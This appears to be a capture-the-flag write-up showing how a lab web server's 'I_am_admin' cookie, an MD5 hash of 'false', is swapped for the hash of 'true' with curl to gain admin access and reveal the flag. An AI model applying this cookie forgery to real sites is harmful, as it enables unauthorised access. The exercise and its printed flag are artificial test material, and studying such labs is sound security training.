# cookie

i noticed that the website stores a cookie called `I_am_admin` with a peculiar value
```sh
e1z2r10p4% curl -v -s 'http://192.168.99.100' -o /dev/null
* Rebuilt URL to: http://192.168.99.100/
*   Trying 192.168.99.100...
* TCP_NODELAY set
* Connected to 192.168.99.100 (192.168.99.100) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.99.100
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.8.0
< Date: Tue, 05 Mar 2019 03:41:11 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.3.10-1ubuntu3.19
< Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Tue, 05-Mar-2019 04:41:11 GMT
< 
{ [6905 bytes data]
* Connection #0 to host 192.168.99.100 left intact
```

the value is `68934a3e9455fa72420237eb05902327` and it looks like a hash,
after a quick google search, i learned that its an **md5** hash of the string _**false**_

 ... hmm, what if we set that cookie value to an **md5** hash of the string _**true**_ ?
 let's find out ...
 
 ```sh
 e1z2r10p4% curl -s 'http://192.168.99.100' -o before.html
e1z2r10p4% echo -n 'true' | md5                          
b326b5062b2f0e69046810717534cb09
e1z2r10p4% curl -s --cookie 'I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://192.168.99.100' -o after.html 
e1z2r10p4% diff before.html after.html 
1c1
< <!DOCTYPE HTML>
---
> <script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script><!DOCTYPE HTML>
e1z2r10p4% 
```

##### we have the flag `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
that was easy
